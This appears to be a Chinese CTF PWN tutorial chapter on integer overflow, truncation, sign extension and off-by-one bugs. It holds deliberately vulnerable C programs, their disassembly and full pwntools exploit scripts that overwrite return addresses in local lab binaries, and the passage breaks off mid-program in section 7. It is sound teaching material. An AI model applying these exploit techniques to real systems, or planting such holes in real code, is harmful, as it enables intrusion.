---
chapter: PWN
section: 整数溢出与 off-by-one
order: 310
tags:
  - CTF
  - PWN
publish: true
---

# P10 整数溢出与 off-by-one
## Integer Overflow & Off-by-one

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L2 栈上利用期 ｜ **前置要求**：[[P06-栈溢出原理与ret2win|P6]] · [[R02-C语言与内存模型回顾|R02]] · [[R03-x86与x64汇编精要复习|R03]]
> **本章目标**：讲清"明明有长度检查的程序"为什么照样越界——整数溢出的五种模式与 off-by-one / off-by-null 各配一个可利用的程序：漏洞代码、编译器放行的原因、反汇编证据、完整利用脚本一个不少；最后汇总成读伪代码时的审计清单。

[[P06-栈溢出原理与ret2win|P6]] 的漏洞入口是 `gets`——函数压根不知道缓冲区多大，长度无从谈起。本章的程序都不一样：==长度受到检查，检查本身却因为整数的宽度与符号失效==。[[P02-前置基础C汇编与Linux|P2]] 预告过三类整型陷阱（减法回绕、有符号无符号混比、截断）会在这里落地；[[R02-C语言与内存模型回顾#8. 整型溢出在反汇编里留下的痕迹|R02 第 8 节]]讲过的类型宽度、整型提升、回绕规则和 movzx / movsx / cdqe 指令痕迹，[[R03-x86与x64汇编精要复习#4. 条件跳转：jcc 家族|R03 第 4 节]]讲过的 jcc 两套跳转，是本章的读码工具，用到时只指路不重讲。

## 1. 整数缺陷的定位：数据错误如何升级成内存错误

先立一个准确的预期：==整数运算本身从不崩溃==。无符号回绕是语言定义的行为（[[R02-C语言与内存模型回顾#8.1 类型宽度与整型提升|R02 8.1]]），有符号溢出虽是未定义行为，`-O0` 下照样按二进制回绕，程序毫无异常。整数溢出的危害全在别处：==这个值接下来控制什么==。它若是普通的数据（成绩、金币数），错也只是数据错误；它若是长度、下标、分配大小，一个回绕就把"写 64 字节"变成"写 4 GB"——数据错误升级成内存错误。

跟踪一个长度变量，它从输入到消费要经过四个环节：

```text
输入（scanf/read 的结果） → 检查（if 比较） → 转换（存进别的类型） → 消费者（read/memcpy/下标）
```

每一站都可能出问题：检查的符号或阈值不对（比较族别选错、挡的上界和缓冲区对不上）；转换改变宽度或符号（截断、符号扩展、有符号无符号互转）；消费者对巨大值的容忍度各有不同（内核函数有区间检查，库函数和裸循环没有）。本章每一种模式，都是在某一站上断掉的案例：

| 模式 | 出问题的环节 | 一句话概括 |
| ---- | ---- | ---- |
| 有符号检查撞上负数（第 2 节） | 检查 + 转换 | 检查按 int，消费按 size_t，负数在中间变成巨大值 |
| 减法下溢（第 3 节） | 检查 + 转换 | "剩余空间"自身回绕，上限检查形同虚设 |
| 截断（第 4 节） | 转换 | 检查的是截断后的小值，拷贝的是截断前的原值 |
| 乘法回绕（第 5 节） | 检查 + 使用 | 乘积回绕成小值过检查，实际按乘数逐条写入 |
| 符号扩展（第 6 节） | 转换 | 一个字节的负值放大成 2⁶⁴−1 |
| off-by-one（第 7 节） | 检查边界 | `i <= n` 多写一格，恰好落在保存的 rbp 上 |
| off-by-null（第 8 节） | 消费者行为 | 字符串函数的收尾 `\0` 多写一格 |

==检查的存在性不等于检查的正确性==——这是全章的审计主线。每种模式都按同一套流程展开：漏洞代码 → 编译器为什么放行 → 反汇编现场 → 利用输入与脚本。所有程序统一用 `gcc -O0 -fno-pie -no-pie -fno-stack-protector` 编译（关防护的原因 [[P06-栈溢出原理与ret2win#1.1 示例程序与编译|P6 1.1]]讲过），工具链用法 [[P05-pwntools与GDB插件工具链|P5]]。

## 2. 模式一：有符号长度检查被负数绕过

### 2.1 漏洞代码

```c
/* neglen.c —— 有符号长度检查被负数绕过（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_neglen_done}");
}

void vuln(void) {
    char buf[64];
    int len;
    printf("len> ");
    scanf("%d", &len);
    if (len < 256) {                    /* 有符号比较：负数全部放行 */
        printf("reading %d bytes\n", len);
        ssize_t got = read(0, buf, len);/* len 是 int，read 的第 3 参数是 size_t */
        printf("got=%zd\n", got);
    } else {
        puts("rejected");
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

程序的意图很清楚：长度不超过 256 才读。但 `len` 是 int，负数全都满足 `len < 256`。

### 2.2 编译器为什么放行

两层原因。语言层：`len < 256` 是完全合法的 int 比较，`scanf` 返回值没查也轮不到默认警告管；转换层：`read` 的原型是 `ssize_t read(int fd, void *buf, size_t count)`，int 的实参传给 size_t 形参是一次==隐式转换==，C 标准不要求警告。默认参数编译全程无警告；显式加 `-Wsign-conversion` 才会提示"隐式转换改变了符号值"——这个开关不在任何默认警告集里。

### 2.3 反汇编现场

两个证据点，各对应一个源码特征：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel neglen，vuln 节选）
  4011fc:  8b 45 ac          	mov    eax,DWORD PTR [rbp-0x54]   ; eax = len
  4011ff:  3d ff 00 00 00    	cmp    eax,0xff                   ; len 与 255 比
  401204:  7f 47             	jg     40124d <vuln+0x82>         ; > 255 才跳去拒绝
  ...
  40121a:  8b 45 ac          	mov    eax,DWORD PTR [rbp-0x54]   ; 又读一遍 len
  40121d:  48 63 d0          	movsxd rdx,eax                    ; ← 符号扩展进 size
  401220:  48 8d 45 b0          	lea    rax,[rbp-0x50]             ; buf 在 rbp-0x50
  401224:  48 89 c6          	mov    rsi,rax
  401227:  bf 00 00 00 00    	mov    edi,0x0
  40122c:  e8 7f fe ff ff    	call   4010b0 <read@plt>
```

其一，比较配的是 `jg`——有符号一族（[[R03-x86与x64汇编精要复习#4. 条件跳转：jcc 家族|R03 第 4 节]]的两套跳转），反推 `len` 是 int；换成 unsigned 声明，同一位置会变成 `jbe`。其二，`call read@plt` 前面一条 `movsxd rdx,eax`——==负数就是在这里"变大"的==：rdx 是 read 的第 3 参数（size_t），`movsxd` 把 eax 的符号位铺满高 32 位，len = -1 变成 0xFFFFFFFFFFFFFFFF（[[R02-C语言与内存模型回顾#8.3 转换点在反汇编里的样子|R02 8.3]]的 cdqe 同源）。

### 2.4 输入 -1：检查放行，read 拒绝

```python
#!/usr/bin/env python3
# exp_neglen.py —— len = -1 过了检查，read 却返回 -1
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

io = process('./neglen')
io.recvuntil(b'len> ')
io.sendline(b'-1')
io.recvuntil(b'reading -1 bytes\n')     # 检查放行，负数原样打印
io.recvuntil(b'got=')
print('got =', io.recvline().decode().strip())
print('exit code =', io.poll(True))
```

输出：

```
got = -1
exit code = 0
```

检查确实放行了，但 read 返回 -1、程序干净退出——==一个字节都没写==。这不是本机配置问题：把不同大小的 count 逐个喂给 read（管道里预放 8 字节），内核的裁决一目了然：

```c
/* probe_read.c —— 不同 count 下 read 的真实返回（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

int main(void) {
    char buf[64];
    size_t cs[] = {
        0xFFFFFFFFFFFFFFFFUL,   /* (size_t)(int)-1：符号扩展 */
        0xFFFFFFFF80000000UL,   /* (size_t)(int)INT_MIN */
        0x0000800000000000UL,   /* 2^47 一带 */
        0x0000000FFFFF0000UL,   /* 2^44 一带 */
        0x0000000100000000UL,   /* 2^32 */
        0x00000000FFFFFFFFUL,   /* 32 位的 (size_t)-1 */
        0x000000007FFFF000UL,   /* 内核单次上限 */
        0x0000000000000040UL,   /* 普通值 */
    };
    for (int i = 0; i < 8; i++) {
        int fds[2];
        pipe(fds);
        write(fds[1], "AAAAAAAA", 8);
        close(fds[1]);
        errno = 0;
        ssize_t r = read(fds[0], buf, cs[i]);
        printf("count=0x%016lx  return=%2zd  %s\n",
               cs[i], r, r < 0 ? strerror(errno) : "ok");
        close(fds[0]);
    }
    return 0;
}
```

输出：

```
count=0xffffffffffffffff  return=-1  Bad address
count=0xffffffff80000000  return=-1  Bad address
count=0x0000800000000000  return=-1  Bad address
count=0x0000000fffff0000  return=-1  Bad address
count=0x0000000100000000  return= 8  ok
count=0x00000000ffffffff  return= 8  ok
count=0x000000007ffff000  return= 8  ok
count=0x0000000000000040  return= 8  ok
```

原因在内核的检查顺序：read 进入内核后先用 `access_ok` 确认 `[buf, buf+count)` 这个区间落在用户地址空间内，==之后==才把过大的 count 钳到单次上限 0x7ffff000。负的 int 符号扩展后至少是 0xFFFFFFFF80000000，区间 `[buf, buf+2⁶⁴量级)` 直接越过 64 位地址空间的尽头，检查当场拒绝（EFAULT，"Bad address"）；而 0xFFFFFFFF 这种"只有 32 位宽"的巨大值，区间还留在用户空间内，检查放行、随后被钳制，read 按上限收下。

> [!warning] 教科书"负长度溢出"在现代 64 位内核上的真实地位
> `if (len < 256) read(0, buf, len)` 喂负数，在 x86-64 Linux 上==打不进一个字节==：符号扩展出来的巨大值全部倒在内核的区间检查上。这个经典缺陷今天能利用的形态是下面三种之一：长度在到达 read 前经过一个 unsigned 中转（零扩展，2.5 节）；宽度被截断成 32 位以下（第 4 节）；程序本身是 32 位（count 只有 32 位宽，没有高位可铺）。审计时看到 movsxd，要接着问一句：==这个负数之后的第一条消费者是谁，它查不查区间==。

### 2.5 同一份检查的可利用形态：unsigned 中转

只加一个中转——长度存进 unsigned 类型的参数再消费，符号扩展就换成了零扩展：

```c
/* neglen2.c —— 同一份检查，长度经 unsigned 中转（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_neglen2_done}");
}

void do_read(char *buf, unsigned int n) {   /* 参数类型是 unsigned：零扩展 */
    ssize_t got = read(0, buf, n);
    printf("got=%zd\n", got);
}

void vuln(void) {
    char buf[64];
    int len;
    printf("len> ");
    scanf("%d", &len);
    if (len < 256) {                        /* 与 neglen.c 相同的有符号检查 */
        printf("reading %d bytes\n", len);
        do_read(buf, len);                  /* int -> unsigned int：-1 变 0xFFFFFFFF */
    } else {
        puts("rejected");
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

`len = -1` 照样通过检查；传给 `do_read` 时 int 换成 unsigned int，==同宽度的符号重解释在机器码里零痕迹==——值不变、解释变了。do_read 内部把 n 装进 read 的第 3 参数：

```asm
; neglen2（objdump -d -M intel，do_read 节选）
  4011de:  8b 55 e4          	mov    edx,DWORD PTR [rbp-0x1c]   ; n 是 unsigned：写 edx 即零扩展
  4011e1:  48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4011e5:  48 89 c6          	mov    rsi,rax
  4011e8:  bf 00 00 00 00    	mov    edi,0x0
  4011ed:  e8 be fe ff ff    	call   4010b0 <read@plt>
```

对比 2.3 的 `movsxd rdx,eax`：这里直接 `mov edx,...`——写 32 位子寄存器把高 32 位清零（[[R03-x86与x64汇编精要复习#2.1 通用寄存器与子寄存器|R03 2.1]]），rdx = 0xFFFFFFFF。内核放行、钳到 0x7ffff000，管道里有多少收多少。buf 在 `rbp-0x40`，偏移 0x40 + 8 = 72：

```python
#!/usr/bin/env python3
# exp_neglen2.py —— -1 经 unsigned 中转变 0xFFFFFFFF，read 钳制后收下现有数据
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011b6        # nm neglen2 | grep win

io = process('./neglen2')
io.recvuntil(b'len> ')
io.sendline(b'-1')
io.recvuntil(b'reading -1 bytes\n')
io.send(b'A' * 72 + p64(WIN))           # buf 在 rbp-0x40：72 填充 + 返回地址
io.recvuntil(b'got=')
print('got =', io.recvline().decode().strip())
print(io.recvline().decode().strip())
io.close()
```

输出：

```
got = 80
flag{p10_neglen2_done}
```

got = 80：read 声称要读 4294967295 字节，实际收下管道里的 80 字节，全部写进 buf——72 字节填充加 8 字节 win 地址正好压上返回地址，`vuln` 返回即进入 `win`。

> [!info]- scanf 与 read 混用时的发送节奏
> `scanf` 走 stdio 缓冲，第一次取数会把管道里==当时已有==的整批数据吸进缓冲区；后面的 `read(0, ...)` 直接读文件描述符，看的是管道里==之后==到达的数据。所以脚本必须按程序输出同步：先 `sendline(b'-1')`，等 `reading -1 bytes` 打印出来再 `send` payload——一次全发会让 payload 被 scanf 那一层吞掉、raw read 反而等不到数据。`gets`/`read` 两种输入函数的停止规则 [[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别|P6 第 7 节]]整理过。

## 3. 模式二：减法下溢掏空剩余空间检查

### 3.1 漏洞代码

"预算式"检查是常见写法：先算出剩余空间，再限制写入长度不超过它。

```c
/* subwrap.c —— 剩余空间的减法下溢（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_subwrap_done}");
}

void vuln(void) {
    char buf[256];
    unsigned int off, len;
    printf("off len> ");
    scanf("%u %u", &off, &len);
    if (off > 512) {                    /* 挡 off 的检查：阈值与 buf 对不上 */
        puts("bad offset");
        return;
    }
    size_t space = sizeof(buf) - off;   /* off > 256 时下溢 */
    printf("space=%zu\n", space);
    if (len > 0 && len <= space) {      /* 第二道检查：space 已经失真 */
        read(0, buf + off, len);
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

两道检查都在场：off 有上界（只是阈值抄成了 512，按另一个 512 字节的缓冲区来的），len 有"不超过剩余空间"的下限。问题出在 space 的算式本身：

$$\text{space} = (\text{sizeof(buf)} - \text{off}) \bmod 2^{64} \tag{10.1}$$

off 超过 256 后，sizeof(buf) − off 在数学上是负数，size_t 按 2⁶⁴ 回绕——off = 280 时 space = 2⁶⁴ − 24 = 18446744073709551592。第二道检查 `len <= space` 面对一个天文数字，永远放行。

### 3.2 编译器为什么放行

减法没有"可能为负"的警告概念——size_t 的回绕是定义好的行为。反汇编里这段算式安静得毫无异常感：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel subwrap，vuln 节选）
  401209:  8b 85 ec fe ff ff    	mov    eax,DWORD PTR [rbp-0x114]  ; off
  40120f:  3d 00 02 00 00       	cmp    eax,0x200
  401214:  76 0c                	jbe    401222 <vuln+0x57>         ; off ≤ 512 放行（无符号）
  401222:  8b 85 ec fe ff ff    	mov    eax,DWORD PTR [rbp-0x114]
  401228:  89 c2                	mov    edx,eax
  40122a:  b8 00 01 00 00       	mov    eax,0x100
  40122f:  48 29 d0             	sub    rax,rdx                    ; space = 256 - off：借位无人看
  401232:  48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  ...
  401256:  8b 85 e8 fe ff ff    	mov    eax,DWORD PTR [rbp-0x118]  ; len
  40125c:  89 c0                	mov    eax,eax                    ; 零扩展：写 eax 清高 32 位
  40125e:  48 39 45 f8          	cmp    QWORD PTR [rbp-0x8],rax    ; space 与 len 比
  401262:  72 27                	jb     40128b <vuln+0xc0>         ; space < len 才拒绝（无符号）
  401264:  8b 85 e8 fe ff ff    	mov    eax,DWORD PTR [rbp-0x118]
  40126a:  89 c2                	mov    edx,eax                    ; read 的 size = len
  40126c:  8b 85 ec fe ff ff    	mov    eax,DWORD PTR [rbp-0x114]  ; off
  401272:  89 c1                	mov    ecx,eax
  401274:  48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]            ; buf 在 rbp-0x110
  40127b:  48 01 c8             	add    rax,rcx                    ; buf + off
  40127e:  48 89 c6             	mov    rsi,rax
  401281:  bf 00 00 00 00       	mov    edi,0x0
  401286:  e8 25 fe ff ff       	call   4010b0 <read@plt>
```

`sub rax,rdx` 不设任何"下溢"信号（CF 里有借位，但没有指令去看它），==回绕在反汇编里不留痕迹==。两个无符号证据倒是清楚：off 检查配 `jbe`、len 比较配 `jb`，都是 a/b 一族。顺带认一条指令：`mov eax,eax` 不是废代码，它把 unsigned int 零扩展成 size_t（写 eax 清高 32 位）——==零扩展在这里，说明 len 参与的是无符号宽运算==。

### 3.3 利用输入与效果

buf 在 `rbp-0x110`，返回地址槽在 `rbp+0x8`，即 `buf + 0x118 = buf + 280`。取 off = 280、len = 8：off 过第一道检查（280 ≤ 512），space 下溢成 18446744073709551592，len = 8 ≤ space 放行——`read(0, buf + 280, 8)` 恰好把 8 个字节写进返回地址槽：

```python
#!/usr/bin/env python3
# exp_subwrap.py —— off=280 让 space 下溢，len=8 直接写返回地址
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011b6        # nm subwrap | grep win

io = process('./subwrap')
io.recvuntil(b'off len> ')
io.sendline(b'280 8')                     # space = 256-280 下溢成巨大值
io.recvuntil(b'space=18446744073709551592\n')
io.send(p64(WIN))                         # buf+280 正是返回地址槽
print(io.recvline().decode().strip())
io.close()
```

输出：

```
flag{p10_subwrap_done}
```

程序自己打印的 space 值就是下溢的直接证据：脚本里 `recvuntil` 匹配的 `18446744073709551592` 正是 2⁶⁴ − 24。审计这类代码时，==先对齐检查阈值与缓冲区大小==：两道检查各挡一头，只要"算 space 的减法"可能下溢，第二道就整体失效。

## 4. 模式三：截断——检查一个宽度，使用另一个宽度

### 4.1 漏洞代码

```c
/* trunc.c —— 截断让检查失效（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_trunc_done}");
}

void vuln(void) {
    char buf[64];
    int len;
    printf("len> ");
    scanf("%d", &len);
    unsigned short check = len;          /* 截断：只留低 16 位 */
    printf("check=%u\n", check);
    if (check <= 256) {                  /* 检查的是截断后的值 */
        ssize_t got = read(0, buf, len); /* 拷贝的是截断前的原值 */
        printf("got=%zd\n", got);
    } else {
        puts("rejected");
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

写这段代码的人相信：`check <= 256` 就等于 `len <= 256`。当 len 是 0 到 65535 之间时确实等价；len 更大时，存进 unsigned short 的动作把高 16 位全部丢弃（[[R02-C语言与内存模型回顾#8.1 类型宽度与整型提升|R02 8.1]]的截断规则）。

### 4.2 编译器为什么放行

截断在 C 里是定义好的行为（取低 16 位），编译器认为你就是要这个结果；默认警告集同样不管，`-Wconversion` 才会提示"隐式转换可能改变值"。反汇编里截断的形状是一个窄存储：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel trunc，vuln 节选）
  4011fc:  8b 45 ac          	mov    eax,DWORD PTR [rbp-0x54]   ; len（int，32 位）
  4011ff:  66 89 45 fe          	mov    WORD PTR [rbp-0x2],ax      ; ← 截断：只存低 16 位
  401203:  0f b7 45 fe          	movzx  eax,WORD PTR [rbp-0x2]     ; 读回的只有 16 位
  ...
  401218:  66 81 7d fe 00 01    	cmp    WORD PTR [rbp-0x2],0x100   ; check 与 256 比
  40121e:  77 33             	ja     401253 <vuln+0x88>         ; ja：无符号一族
  401220:  8b 45 ac          	mov    eax,DWORD PTR [rbp-0x54]   ; ← 又读回 32 位原值
  401223:  48 63 d0          	movsxd rdx,eax                    ; 原值送进 read 的 size
  401226:  48 8d 45 b0          	lea    rax,[rbp-0x50]
  ...
  401232:  e8 79 fe ff ff    	call   4010b0 <read@plt>
```

==`mov WORD PTR [..],ax` 这种窄存储就是截断点==：64 位槽里只写进低 16 位。检查读回的是 16 位值、配 `ja`（check 是 unsigned short）；拷贝读回的却是 32 位原值、经 `movsxd` 送进 read。==检查用一个宽度，使用用另一个宽度==，两边对不上，检查就不再约束实际拷贝的长度。

### 4.3 利用输入与效果

取 len = 65576 = 0x10028：低 16 位是 0x0028 = 40，check = 40 ≤ 256 放行；read 拿到的仍是 65576。buf 在 `rbp-0x50`，发送 88 字节填充加返回地址：

```python
#!/usr/bin/env python3
# exp_trunc.py —— 65576 截断成 40 过检查，原值 65576 拿去拷贝
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011b6        # nm trunc | grep win

io = process('./trunc')
io.recvuntil(b'len> ')
io.sendline(b'65576')                     # 0x10028，低 16 位是 0x28 = 40
io.recvuntil(b'check=40\n')
io.send(b'A' * 88 + p64(WIN))             # read 的长度仍是原值 65576
io.recvuntil(b'got=')
print('got =', io.recvline().decode().strip())
print(io.recvline().decode().strip())
io.close()
```

输出：

```
got = 96
flag{p10_trunc_done}
```

got = 96：read 把 88 字节填充加 8 字节地址全部收下，覆盖返回地址。

> [!info]- 截断的两个相邻方向
> 其一，源码里手写的 `len &= 0xff` 与截断到 unsigned char 等价（对非负值），审计时看到按位掩码要同时当成"截断"看——掩码不只清位，还造新值。其二，负数撞上这类检查反而会被挡住：len = -1 时 check = 65535 > 256，拒绝——==同一个检查对不同输入的失效方向不同==，审计要把负数、0、巨大值三个方向都过一遍。堆上的同类问题还有一个方向："小分配、大拷贝"——分配大小被截小、拷贝长度用原值，那是堆章节（P12 起）的正式内容。

## 5. 模式四：乘法回绕——总量检查形同虚设

### 5.1 漏洞代码

`malloc(count * size)` 是这一模式的经典出现位置：count 很大时 32 位乘积回绕，分到一个很小的堆块，随后按 count 逐条写入就把堆溢了（堆章节详述）。同一思路在栈上用下标演示：总量检查算的是回绕后的乘积，实际写入却按乘数逐条进行：

```c
/* mulwrap.c —— 乘法回绕绕过总量检查（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_mulwrap_done}");
}

void vuln(void) {
    char buf[64];
    unsigned int count, size;
    printf("count size> ");
    scanf("%u %u", &count, &size);
    unsigned int total = count * size;   /* 按 unsigned int 模 2^32 回绕 */
    printf("total=%u\n", total);
    if (total <= 64) {
        /* 实际按 count 条、每条 size 字节收数据 */
        for (unsigned int i = 0; i < count; i++)
            if (read(0, buf + i * size, size) <= 0)
                break;
    } else {
        puts("rejected");
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

$$\text{total} = (count \times size) \bmod 2^{32} \tag{10.2}$$

检查的是 total（10.2 的回绕值），干活的循环却要跑 count 次、每次写 size 字节——两边只在"乘积不回绕"时才一致。

### 5.2 编译器为什么放行

双操作数 `imul` 把结果截断到寄存器宽度（[[R03-x86与x64汇编精要复习#3.5 乘法与除法|R03 3.5]]），==溢出标志 OF 虽然置位，但没有任何指令去看它==——C 语言的 unsigned 乘法本来就定义为取模，编译器不认为有错：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel mulwrap，vuln 节选）
  401200:  8b 55 ac          	mov    edx,DWORD PTR [rbp-0x54]   ; count
  401203:  8b 45 a8          	mov    eax,DWORD PTR [rbp-0x58]   ; size
  401206:  0f af c2          	imul   eax,edx                    ; 32 位乘法：高位直接丢弃
  401209:  89 45 f8          	mov    DWORD PTR [rbp-0x8],eax    ; total（回绕后的）
  ...
  401220:  83 7d f8 40          	cmp    DWORD PTR [rbp-0x8],0x40   ; total 与 64 比
  401224:  77 3e             	ja     401264 <vuln+0x99>         ; 无符号比较
  ...
  40122f:  8b 45 a8          	mov    eax,DWORD PTR [rbp-0x58]   ; ┌ 循环体：
  401232:  89 c2             	mov    edx,eax                    ; │
  401234:  8b 45 a8          	mov    eax,DWORD PTR [rbp-0x58]
  401237:  0f af 45 fc          	imul   eax,DWORD PTR [rbp-0x4]    ; │ i * size
  40123b:  89 c1             	mov    ecx,eax
  40123d:  48 8d 45 b0          	lea    rax,[rbp-0x50]             ; │ buf
  401241:  48 01 c8          	add    rax,rcx                    ; │ buf + i*size
  401244:  48 89 c6          	mov    rsi,rax                    ; │
  401247:  bf 00 00 00 00    	mov    edi,0x0                    ; │
  40124c:  e8 5f fe ff ff    	call   4010b0 <read@plt>           ; └ 每条 read size 字节
  401251:  48 85 c0          	test   rax,rax
  401254:  7e 1a             	jle    401270 <vuln+0xa5>         ; 返回值 ≤ 0 退出循环
```

### 5.3 利用输入与效果

取 count = size = 65536 = 2¹⁶：乘积 2³² 回绕成 0，total = 0 ≤ 64 放行；循环从 i = 0 开始，第一条 `read(0, buf, 65536)` 就把发来的所有数据写进 buf。buf 在 `rbp-0x50`，发送 88 填充加返回地址共 96 字节：

```python
#!/usr/bin/env python3
# exp_mulwrap.py —— 65536 x 65536 的乘积回绕成 0，总量检查放行
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011b6        # nm mulwrap | grep win

io = process('./mulwrap')
io.recvuntil(b'count size> ')
io.sendline(b'65536 65536')
io.recvuntil(b'total=0\n')
io.send(b'A' * 88 + p64(WIN))   # 第一轮 read 就把 88+8 字节写进 buf
print(io.recvline().decode().strip())
io.close()
```

输出：

```
flag{p10_mulwrap_done}
```

还有一个此题特有的细节值得记住：96 字节 payload 里落在 `[rbp-0x4]` 的那 4 字节恰好是循环变量 i 的存储槽——payload 把 i 覆盖成 0x41414141，i++ 后远大于 count = 65536，循环当场退出、函数得以返回。==填充字节会顺便覆盖循环变量、标志位这一类之后还要被读写的活数据==，payload 要给每个被覆盖的槽安排好覆盖后的值。

## 6. 模式五：符号扩展——一个字节的负值放大成 2⁶⁴−1

### 6.1 漏洞代码

截断造出负值，符号扩展把它放大——两个"无害"的转换连起来就是一条通路：

```c
/* sext.c —— 截断出负值，符号扩展放大成长度（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_sext_done}");
}

void vuln(void) {
    char buf[64];
    int v;
    char len;
    printf("len> ");
    scanf("%d", &v);
    len = v;                            /* int -> char：截断 */
    printf("len=%d\n", len);
    if (len < 100) {                    /* char 的有符号比较 */
        size_t n = len;                 /* char -> size_t：符号扩展 */
        printf("n=%zu\n", n);
        ssize_t got = read(0, buf, n);
        printf("got=%zd\n", got);
    } else {
        puts("rejected");
    }
}

int main(void) {
    setbuf(stdout, NULL);
    vuln();
    return 0;
}
```

输入 255：存进 char 截断成 -1；-1 < 100 放行；`size_t n = len` 符号扩展成 18446744073709551615。与第 2 节的对照：那里是 int（本身已是 32 位）直接负值，这里多了==先截断出负值==这一步——输入的 255 明明是正数，是截断把它变成负的。

### 6.2 反汇编现场

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel sext，vuln 节选）
  4011fc:  8b 45 9c          	mov    eax,DWORD PTR [rbp-0x64]   ; v（int）
  4011ff:  88 45 ff          	mov    BYTE PTR [rbp-0x1],al      ; ← 截断到 char
  401202:  0f be 45 ff          	movsx  eax,BYTE PTR [rbp-0x1]     ; 读回：符号扩展
  ...
  401217:  80 7d ff 63          	cmp    BYTE PTR [rbp-0x1],0x63    ; char 与 99 比
  40121b:  7f 50             	jg     40126d <vuln+0xa2>         ; jg：有符号一族
  40121d:  48 0f be 45 ff       	movsx  rax,BYTE PTR [rbp-0x1]     ; ← char → size_t：符号扩展
  401222:  48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax   ; n = 2^64-1
  ...
  40123c:  48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  401240:  48 8d 45 a0          	lea    rax,[rbp-0x60]
  401244:  48 89 c6          	mov    rsi,rax
  401247:  bf 00 00 00 00    	mov    edi,0x0
  40124c:  e8 5f fe ff ff    	call   4010b0 <read@plt>
```

三个证据连成链：窄存储 `mov BYTE PTR`（截断点）、`cmp BYTE PTR` 配 `jg`（char 是有符号的）、`movsx rax`（符号扩展点）。最后那条 `movsx` 的 48 前缀把它升成 64 位形式——1 字节直接铺满 8 字节。

### 6.3 利用输入与两个结局

先跑原版（sext.c）：

```python
#!/usr/bin/env python3
# exp_sext.py —— 255 截断成 char 是 -1，符号扩展成 2^64-1，read 返回 -1
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

io = process('./sext')
io.recvuntil(b'len> ')
io.sendline(b'255')
io.recvuntil(b'len=-1\n')
io.recvuntil(b'n=18446744073709551615\n')
io.recvuntil(b'got=')
print('got =', io.recvline().decode().strip())
print('exit code =', io.poll(True))
```

输出：

```
got = -1
exit code = 0
```

放大是真的（n = 2⁶⁴−1），内核的区间检查也是真的——与 2.4 节同一道关卡，read 返回 -1。==同一个 -1，流向不同的消费者，结果不同==。给程序加一步"先截断成 16 位再升宽"（sext2.c，vuln 的相关两行）：

```c
        unsigned short n = len;         /* char -> unsigned short：-1 变 65535 */
        printf("n=%u\n", n);
        ssize_t got = read(0, buf, n);
```

反汇编里这条链每一步都看得见：

```asm
; sext2（objdump -d -M intel，vuln 节选）
  40121d:  66 0f be 45 ff       	movsx  ax,BYTE PTR [rbp-0x1]      ; 先符号扩展成 16 位
  401222:  66 89 45 fc          	mov    WORD PTR [rbp-0x4],ax      ; 存进 unsigned short：截断
  401226:  0f b7 45 fc          	movzx  eax,WORD PTR [rbp-0x4]     ; 读回：零扩展
  ...
  40123b:  0f b7 55 fc          	movzx  edx,WORD PTR [rbp-0x4]     ; read 的 size = 65535
```

n = 65535，落在内核放行的范围内。buf 在 `rbp-0x50`，偏移 88：

```python
#!/usr/bin/env python3
# exp_sext2.py —— 同一个 -1 截断成 16 位是 65535，read 照常收数
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011b6        # nm sext2 | grep win

io = process('./sext2')
io.recvuntil(b'len> ')
io.sendline(b'255')
io.recvuntil(b'len=-1\n')
io.recvuntil(b'n=65535\n')
io.send(b'A' * 88 + p64(WIN))           # buf 在 rbp-0x50：88 填充 + 返回地址
io.recvuntil(b'got=')
print('got =', io.recvline().decode().strip())
print(io.recvline().decode().strip())
io.close()
```

输出：

```
got = 96
flag{p10_sext2_done}
```

`-1 → 18446744073709551615 → read 拒绝` 与 `-1 → 65535 → read 照收`，起点同为一个字节的 0xFF。==审计符号扩展时，终点不是"值变大了"，而是"变大的值走哪条路"==——这条路与第 2、4 节的结论汇合成同一句话：盯消费者。

## 7. off-by-one：多写的那一格

整数缺陷之外，本章后半处理两个"只差一个字节"的边界缺陷。off-by-one 指写入比缓冲区多出一格；在栈上，这一格如果恰好落在保存的 rbp 的低位字节上，就能做到==不动返回地址而迁移整个栈==。

### 7.1 循环边界 i <= n

```c
/* obo.c —— off-by-one：i <= n 多写一格（x86-64 Linux） */
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_obo_done}");
}

int n;
int i;

void vuln(void) {
    char buf[64];
    printf("n> ");
    scanf("%d", &n);
    if (n > 64) {
        puts("rejected");
        return;
    }
